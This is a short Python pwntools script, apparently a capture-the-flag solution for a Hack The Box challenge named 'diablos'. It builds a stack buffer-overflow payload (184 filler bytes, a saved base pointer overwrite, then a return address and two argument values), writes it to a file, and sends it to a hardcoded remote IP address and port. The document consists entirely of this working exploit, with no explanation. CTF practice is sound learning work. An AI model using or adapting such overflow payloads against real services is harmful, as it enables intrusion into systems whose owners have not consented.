from pwn import *

exploit_str = "1" * 184 + "2" * 4   # Fill buffer and old BP
exploit_str = exploit_str.encode()
exploit_str += p32(0x080491e2) \
               + p32(0x08049264) \
               + p32(0xdeadbeef) \
               + p32(0xc0ded00d)

print("=========================")

print("Storing exploit string...")
file = open("../htb/diablos/hack.txt", "wb")
file.write(exploit_str)
file.write("\n".encode())
file.close()
print("Done")

print("=========================")

conn = connect("46.101.61.42", 32715)

print(conn.recv().decode())
print("=========================")
print("Sending exploit string:")
print(exploit_str)

conn.sendline(exploit_str)
print(conn.recv())